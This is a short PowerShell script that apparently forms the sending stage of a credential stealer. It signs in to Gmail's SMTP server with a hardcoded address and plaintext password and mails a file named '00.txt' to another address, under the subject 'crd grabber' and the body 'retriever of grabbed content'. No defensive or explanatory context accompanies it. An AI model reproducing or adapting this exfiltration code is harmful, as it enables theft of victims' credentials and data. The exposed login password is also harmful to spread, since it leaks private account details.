$SmtpServer = 'smtp.gmail.com'
$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
$SMTPInfo.EnableSsl = $true
$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('leylon2382@gmail.com', 'Orazmyradov_02052002')
$ReportEmail = New-Object System.Net.Mail.MailMessage
$ReportEmail.From = 'leylon2382@gmail.com'
$ReportEmail.To.Add('leylon2381@gmail.com')
$ReportEmail.Subject = 'crd grabber'
$ReportEmail.Body = 'retriever of grabbed content'
$ReportEmail.Attachments.Add('00.txt')
$SMTPInfo.Send($ReportEmail)
